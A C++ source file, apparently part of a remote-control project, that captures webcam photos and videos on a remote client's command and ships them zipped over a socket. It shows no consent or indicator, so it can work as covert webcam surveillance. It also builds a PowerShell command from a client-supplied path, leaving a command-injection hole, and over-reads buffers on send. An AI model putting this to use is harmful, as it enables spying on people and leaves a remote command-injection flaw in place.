#include "webcam_thread.h"

// Function to send a message to the client
void WebcamThread::sendMessage(json message) {
    string tam = message.dump();
    int count = send(client_socket, tam.c_str(), BUFFER_SIZE, 0);
}

// Function to compress a folder as a zip file
bool WebcamThread::zipFolder(string folder_path) {
    string cmd = "powershell Compress-Archive -Path \"" + folder_path + "\" " + "-DestinationPath \"" + folder_path + "\"";
    return system(cmd.c_str()) == 0;
}

// Function to create a reply message for the client
json WebcamThread::creatReplyMessageByWebcam(int status) {
    json reply;
    reply["cmd"] = "webcam";

    ifstream input(folder_path + ".zip", ios::binary | ios::ate);
    if (!input.is_open()) {
        cout << "FILE CANT OPENT" << endl;
        return reply;
    }
    int file_size = input.tellg();
    input.close();

    reply["body"]["error_code"] = to_string(status);
    reply["body"]["path"] = folder_path + ".zip";
    reply["body"]["bytes"] = file_size;
    reply["body"]["filename"] = (string)requestFromClient["filename"] + ".zip";
    log(reply.dump(4));
    return reply;
}

// Function to create a folder for saving the webcam images/videos
string WebcamThread::creatFolderForSaving() {
    string folderName = get_current_time() + "_WEBCAM";
    string requestPath = requestFromClient.contains("save_path") ? requestFromClient["save_path"] : "";
    string path = requestPath != "" ? requestPath + folderName : getProjectRootDirectory() + "\\" + folderName;

    requestFromClient["save_path"] = path;
    requestFromClient["filename"] = folderName;

    if (_mkdir(path.c_str()) == 0) {
        log("Folder: " + path + " created successfully", SUCCESS_LOG);
    }
	else log("Error: Failed to create folder: " + path, ERROR_LOG);
    return path;
}

// Function to capture a single photo from the webcam
void WebcamThread::webcamCapture() {
    int status = 0;
    json message;

    // Open the default camera
    cv::VideoCapture cap(0);

    // Retry mechanism
    for (int retries = 0; retries < 5; ++retries) {
        if (cap.isOpened()) break;
        this_thread::sleep_for(chrono::milliseconds(200)); // Wait for 200 ms
    }

    if (!cap.isOpened()) {
		log("Error: Could not open the camera after retries.", ERROR_LOG);
        return;
    }

    // Warm up the camera by capturing a few frames
    for (int i = 0; i < 30; ++i) {
        cv::Mat temp;
        cap >> temp;
    }

    // Capture a single frame
    cv::Mat frame;
    cap >> frame;

    // Check if the frame is valid
    if (frame.empty()) {
		log("Could not capture a frame from the camera.", ERROR_LOG);
        cap.release();
        return;
    }

    // Save the frame as an image
    string file_path = folder_path + "\\" + get_current_time() + ".png";
    if (!cv::imwrite(file_path, frame)) {
		log("Could not save the image to the file path: " + file_path, ERROR_LOG);
    }
    else {
		log("Image saved to: " + file_path, SUCCESS_LOG);
    }

    // Release the camera
    cap.release();
    cv::destroyAllWindows();

    // Allow time for the camera to fully deactivate
    this_thread::sleep_for(chrono::milliseconds(100));

    if (zipFolder(folder_path)) {
        status = 1;
        message = creatReplyMessageByWebcam(status);
    }
    else {
        status = -301;
        message = creatReplyMessageByWebcam(status);
    }
    sendMessage(message);

    string zip_filename = folder_path + ".zip";
    sendFile(zip_filename, client_socket);

	log("Webcam image sent successfully", SUCCESS_LOG);
}

// Function to create a new thread that captures multiple photos from the webcam
void WebcamThread::webcamWorkerThread() {
    // Send response to the client that the screenshot thread has started
    json response = {
        {"cmd", "webcamitv"},
        {"body", {
            {"status", "started"},
        }}
    };

    string responseString = response.dump();
    send(client_socket, responseString.c_str(), BUFFER_SIZE, 0);

    // Start webcam capture process
    cv::VideoCapture cap(0);
    json message;

    // Retry mechanism to check if the camera is opened
    for (int retries = 0; retries < 5; ++retries) {
        if (cap.isOpened()) break;
        log("Retry #" + to_string(retries + 1) + ": Unable to open camera.", WARNING_LOG);
        this_thread::sleep_for(chrono::milliseconds(200)); // Wait for 200 ms
    }

    if (!cap.isOpened()) {
		log("Could not open the camera after retries.", ERROR_LOG);
        return;
    }

    // Start capturing images within the specified interval
    while (webcam_running) {
        this_thread::sleep_for(chrono::seconds(interval));
        for (int i = 0; i < 1; i++) {
            cv::Mat frame;
            for (int i = 1; i < 30; i++) {
                cv::Mat temp;
                cap >> temp;
            }
            cap >> frame;
            cv::imwrite(folder_path + "\\" + get_current_time() + ".png", frame);
        }
		log("Webcam image saved successfully", SUCCESS_LOG);
    }
    cap.release();
    cv::destroyAllWindows();

    // Zip folder and send response
    if (zipFolder(folder_path)) {
        message = creatReplyMessageByWebcam(1);
    }
    else {
        message = creatReplyMessageByWebcam(-301);
    }

    message["body"]["status"] = "stopped";
    sendMessage(message);
    string zip_filename = folder_path + ".zip";
    sendFile(zip_filename, client_socket);

	log("Webcam images sent successfully", SUCCESS_LOG);
}

// Function to create a new thread that captures multiple videos from the webcam
void WebcamThread::videoWorkerThread() {
    // Send response to the client that the screenshot thread has started
    json response = {
        {"cmd", "webcamvideo"},
        {"body", {{"status", "started"}}}
    };

    string responseString = response.dump();
    send(client_socket, responseString.c_str(), BUFFER_SIZE, 0);

    // Start video recording process
    json message;
    cv::VideoCapture cap(0);

    // Retry mechanism for camera
    for (int retries = 0; retries < 5; ++retries) {
        if (cap.isOpened()) break;
        log("Retry #" + to_string(retries + 1) + ": Unable to open camera.", WARNING_LOG);
        this_thread::sleep_for(chrono::milliseconds(200));
    }

    if (!cap.isOpened()) {
		log("Could not open the camera after retries.", ERROR_LOG);
        cap.release();
        return;
    }

    // Retrieve frame dimensions and validate them
    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
    int fps = 30;
    int total_file_size = 0;
    bool keep_thread_alive = false;

    if (frame_width == 0 || frame_height == 0) {
        log("Invalid frame dimensions retrieved from camera.", ERROR_LOG);
        cap.release();
        return;
    }

    string video_path = folder_path + "\\" + get_current_time() + ".mp4";
    cv::VideoWriter video(video_path, cv::VideoWriter::fourcc('X', '2', '6', '4'), fps, cv::Size(frame_width, frame_height));
    if (!video.isOpened()) {
        log("Codec not supported for video writing.", ERROR_LOG);
    }
    else {
        log("Video writer initialized with the codec.", SUCCESS_LOG);
    }

    if (!video.isOpened()) {
        log("Could not open the camera after retries.", ERROR_LOG);
        cap.release();
        return;
    }

    // Start recording multiple videos within the specified interval
    auto start_time = chrono::steady_clock::now();
    while (webcam_running) {
        cv::Mat frame;
        cap >> frame;

        if (frame.empty()) {
			log("Could not capture a frame from the camera.", ERROR_LOG);
            break;
        }

        video.write(frame);

        auto current_time = chrono::steady_clock::now();
        auto elapsed_time = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
        if (elapsed_time - 1 >= interval) {
            // Close current video and start a new one
            video.release();

            // Update the total_file_size of all saved videos
            total_file_size += get_file_size(video_path.c_str());

            // Check if the total file size exceeds 25 MB
            if (total_file_size >= 25000000) {
                log("Total file size exceeded 25 MB. Stopping process...", WARNING_LOG);

                // Delete the last video file
                if (remove(video_path.c_str()) != 0) {
                    log("Failed to delete the last video file.", ERROR_LOG);
                }

                keep_thread_alive = true;
                break;
            }

            video_path = folder_path + "\\" + get_current_time() + ".mp4";
            video.open(video_path, cv::VideoWriter::fourcc('X', '2', '6', '4'), fps, cv::Size(frame_width, frame_height));

            if (!video.isOpened()) {
                log("Failed to create new video file during runtime.", ERROR_LOG);
                break;
            }

            start_time = chrono::steady_clock::now();
			log("New video saved", SUCCESS_LOG);
        }
    }

    cap.release();
    video.release();
    cv::destroyAllWindows();

    // Wait for the stop signal from the client
    while (keep_thread_alive && webcam_running) {
        this_thread::sleep_for(chrono::seconds(1));
    }

    // Zip folder and send response
    if (zipFolder(folder_path)) {
        message = creatReplyMessageByWebcam(1); // Success code
    }
    else {
        message = creatReplyMessageByWebcam(-302); // Error code for zipping failure
    }

    message["body"]["status"] = "stopped";
    sendMessage(message);

    // Send zipped folder
    string zip_filename = folder_path + ".zip";
    sendFile(zip_filename, client_socket);

    log("Webcam video sent successfully", SUCCESS_LOG);
}

// Setter for interval
void WebcamThread::setInterval(int interval) {
    this->interval = interval;
}

// Function to start the webcam capture process
void WebcamThread::startCapture(json request, const string& type) {
    requestFromClient = request;
    if (type == "single") {
        folder_path = creatFolderForSaving();
        webcamCapture();
    }
    else {
        // If the thread is already running, dont start another one
        if (webcam_running) {
            log("Webcam thread is already running", WARNING_LOG);
        }
        else {
            webcam_running = true;
            folder_path = creatFolderForSaving();
            worker = thread(&WebcamThread::webcamWorkerThread, this);
        }
    }
}

// Function to start the webcam video recording process
void WebcamThread::startVideo(json request) {
    requestFromClient = request;
    // If the thread is already running, dont start another one
    if (webcam_running) {
        log("Webcam thread is already running", WARNING_LOG);
    }
    else {
        webcam_running = true;
        folder_path = creatFolderForSaving();
        worker = thread(&WebcamThread::videoWorkerThread, this);
    }
}

// Function to stop the webcam capture/video recording process
void WebcamThread::stop() {
    webcam_running = false;
    if (worker.joinable()) {
        worker.join();
    }
    folder_path = "";
}
